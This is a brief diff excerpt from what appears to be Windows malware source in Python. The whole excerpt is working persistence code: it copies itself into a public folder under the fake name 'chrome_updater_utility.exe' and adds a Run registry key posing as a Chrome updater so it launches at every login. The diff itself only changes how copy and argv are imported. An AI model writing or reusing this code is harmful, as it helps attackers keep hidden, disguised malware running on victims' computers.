@@ -18,7 +18,7 @@ if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
 dir = r"C:\\Users\\Public\\Libraries\\chrome_updater_utility.exe"
 
 def persistence():
-    shutil.copy(sys.argv[0], dir)
+    copy(argv[0], dir)
     aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
     aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
     SetValueEx(aKey,"Chrome_updater_utility", 0, REG_SZ, dir)    
